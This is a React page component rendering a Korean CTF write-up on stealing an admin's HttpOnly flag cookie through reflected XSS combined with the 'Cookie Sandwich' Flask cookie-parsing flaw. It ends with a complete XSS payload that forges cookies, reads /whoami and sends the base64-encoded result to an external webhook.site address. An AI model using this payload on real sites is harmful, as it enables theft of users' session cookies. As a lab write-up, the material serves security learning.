export default function Problem1() {
  const payload = `<script>
(async () => {
    document.cookie = 'whoami="captured:; path=/whoami';
    document.cookie = 'end="; path=/'; 
    const res = await fetch('/whoami');
    const json = await res.text(); 
    await fetch(\`https://webhook.site/웹훅주소/?attempt3=\${btoa(json)}\`);
})();
</script>`;

  return (
    <div className="space-y-10">

      {/* 1. 문제 개요 */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          1. Problem Overview
        </h2>
        <p className="text-neutral-300 font-sans leading-relaxed text-sm">
          본 과제의 핵심 목표는 <span className="text-emerald-400 font-semibold">HttpOnly</span> 속성이 설정된 관리자(Admin)의
          flag 쿠키를 탈취하는 것이다. <span className="text-emerald-400 font-semibold">HttpOnly</span> 속성이 부여된 쿠키는 브라우저 단에서
          JavaScript의 <span className="text-emerald-400 font-semibold">document.cookie</span>를 통해 직접 접근할 수 없다.
        </p>
        <p className="text-neutral-300 font-sans leading-relaxed text-sm">
          따라서 이를 우회하기 위해 클라이언트 사이드 취약점과 서버 측의 쿠키 파싱 오류를 연계하여, 서버가 스스로 HttpOnly 쿠키를
          응답 본문에 반사하도록 유도하는 <span className="text-emerald-400 font-semibold">Cookie Sandwich Technique</span>을 활용하였다.
          이는 PortSwigger Research에서 소개된 바 있는 기법이다.
        </p>
      </div>

      {/* 2. 취약점 분석 */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          2. Vulnerability Analysis
        </h2>
        <p className="text-neutral-400 font-sans text-sm leading-relaxed">
          해당 애플리케이션은 크게 세 가지 엔드포인트와 하나의 서버 측 결함을 지니고 있다.
        </p>
        <div className="space-y-3">
          {[
            {
              endpoint: "/report",
              desc: (
                <>
                  <span className="text-emerald-400 font-semibold">path</span> 파라미터를 통해 관리자 봇을 원하는 주소로 이동시키는 진입점이다. 
                  관리자 봇은 접근 시 <span className="text-emerald-400 font-semibold">flag 쿠키(HttpOnly 속성)</span>와{" "}
                  <span className="text-emerald-400 font-semibold">whoami 쿠키</span>를 지닌 상태로 이동한다.
                </>
              ),
            },
            {
              endpoint: "/memo",
              desc: (
                <>
                  <span className="text-emerald-400 font-semibold">memo</span> 파라미터로 입력받은 값을 이스케이프 처리 없이{" "}
                  <span className="text-emerald-400 font-semibold">HTTP 응답 본문</span>에 그대로{" "}
                  <span className="text-emerald-400 font-semibold">반사(Reflect)</span>한다. 이는 악성{" "}
                  <span className="text-emerald-400 font-semibold">&lt;script&gt;</span>를 실행시킬 수 있는{" "}
                  <span className="text-emerald-400 font-semibold">XSS 취약점</span>으로 작용한다.
                </>
              ),
            },
            {
              endpoint: "/whoami",
              desc: (
                <>
                  사용자의 <span className="text-emerald-400 font-semibold">whoami 쿠키</span> 값을 읽어들여{" "}
                  <span className="text-emerald-400 font-semibold">JSON</span> 형태의 응답 본문에 그대로 반영하여 노출하는 기능을 수행한다.
                </>
              ),
            },
          ].map(({ endpoint, desc }) => (
            <div key={endpoint} className="flex gap-4 p-4 bg-neutral-950 rounded-xl border border-neutral-800">
              <code className="text-emerald-400 font-mono text-sm shrink-0 mt-0.5">{endpoint}</code>
              <div className="text-neutral-300 font-sans text-sm leading-relaxed">{desc}</div>
            </div>
          ))}
          <div className="flex gap-4 p-4 bg-neutral-950 rounded-xl border border-red-900/40">
            <code className="text-red-400 font-mono text-sm shrink-0 mt-0.5">서버 결함</code>
            <p className="text-neutral-300 font-sans text-sm leading-relaxed">
              <span className="text-emerald-400 font-semibold">Flask</span> 기반의 서버가 쿠키를 파싱할 때, 쿠키 값이 큰따옴표(<code className="bg-neutral-800 text-yellow-400 px-1 rounded text-xs">"</code>)로
              시작할 경우 닫는 큰따옴표가 등장할 때까지 뒤따르는 모든 쿠키(<span className="text-emerald-400 font-semibold">HttpOnly 쿠키 포함</span>)를 선행 쿠키의 값으로 병합해 버리는 논리적 오류가 존재한다.
            </p>
          </div>
        </div>
      </div>

      {/* 3. 공격 과정 */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          3. Exploit
        </h2>
        <div className="space-y-6">
          {[
            {
              step: "01",
              title: "악성 스크립트 작성 및 봇 유도",
              desc: (
                <>
                  <span className="text-emerald-400 font-semibold">/memo</span> 엔드포인트를 활용하여 관리자 봇의 브라우저에서 실행될{" "}
                  <span className="text-emerald-400 font-semibold">XSS 페이로드</span>를 구성한다. 봇의 진입점인{" "}
                  <span className="text-emerald-400 font-semibold">/report</span>를 호출하여 봇이 해당 XSS 경로를 방문하도록 유도한다.
                </>
              ),
            },
            {
              step: "02",
              title: "쿠키 샌드위치 구성",
              desc: (
                <>
                  XSS 코드가 실행되면, <span className="text-emerald-400 font-semibold">document.cookie</span>를 통해{" "}
                  <span className="text-emerald-400 font-semibold">whoami="captured:; path=/whoami</span> 와{" "}
                  <span className="text-emerald-400 font-semibold">end="; path=/</span> 라는 두 개의 쿠키가 강제 생성된다. 이로 인해 탈취 대상인{" "}
                  <span className="text-emerald-400 font-semibold">flag 쿠키</span> 앞뒤로 큰따옴표 블록이 형성된다.
                </>
              ),
            },
            {
              step: "03",
              title: "파싱 오류 트리거",
              desc: (
                <>
                  이후 스크립트가 <span className="text-emerald-400 font-semibold">/whoami</span> 경로로 요청(<span className="text-emerald-400 font-semibold">fetch</span>)을 보낸다.{" "}
                  <span className="text-emerald-400 font-semibold">path=/whoami</span> 설정에 의해 조작된{" "}
                  <span className="text-emerald-400 font-semibold">whoami 쿠키</span>가 서버로 먼저 전송되고, 서버는 파싱 오류를 일으켜 중간에 위치한{" "}
                  <span className="text-emerald-400 font-semibold">flag 쿠키</span> 내용 전체를 whoami 쿠키 값의 일부로 병합한다.
                </>
              ),
            },
            {
              step: "04",
              title: "데이터 반출",
              desc: (
                <>
                  <span className="text-emerald-400 font-semibold">/whoami</span> 엔드포인트는 병합된 쿠키 값(captured:: flag=...)을{" "}
                  <span className="text-emerald-400 font-semibold">JSON 응답</span>에 담아 반환한다. XSS 코드는 이 응답을 읽어들인 후,{" "}
                  <span className="text-emerald-400 font-semibold">Base64</span>로 인코딩(<span className="text-emerald-400 font-semibold">btoa</span>)하여 공격자가 제어하는 외부{" "}
                  <span className="text-emerald-400 font-semibold">Webhook</span> 주소로 전송한다.
                </>
              ),
            },
            {
              step: "05",
              title: "플래그 획득",
              desc: (
                <>
                  <span className="text-emerald-400 font-semibold">Webhook</span>으로 수신된{" "}
                  <span className="text-emerald-400 font-semibold">Base64</span> 문자열을 디코딩하여 최종적으로{" "}
                  <span className="text-emerald-400 font-semibold">flag 값</span>을 획득하였다.
                </>
              ),
            },
          ].map(({ step, title, desc }) => (
            <div key={step} className="flex gap-5">
              <div className="shrink-0 w-9 h-9 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
                <span className="font-orbitron text-emerald-400 text-xs">{step}</span>
              </div>
              <div className="space-y-1 pt-1">
                <h3 className="text-white font-semibold font-sans text-sm">{title}</h3>
                <div className="text-neutral-400 font-sans text-sm leading-relaxed">{desc}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* 4. PAYLOAD */}
      <div className="space-y-4">
        <h2 className="text-xl font-orbitron text-white border-b border-neutral-800 pb-3">
          4. PAYLOAD
        </h2>
        <div className="p-6 bg-emerald-500/5 border border-emerald-500/20 rounded-xl relative group overflow-hidden">
          <pre className="font-mono text-emerald-300 text-sm leading-relaxed whitespace-pre-wrap lg:whitespace-pre">
            {payload}
          </pre>
        </div>
      </div>

    </div>
  );
}
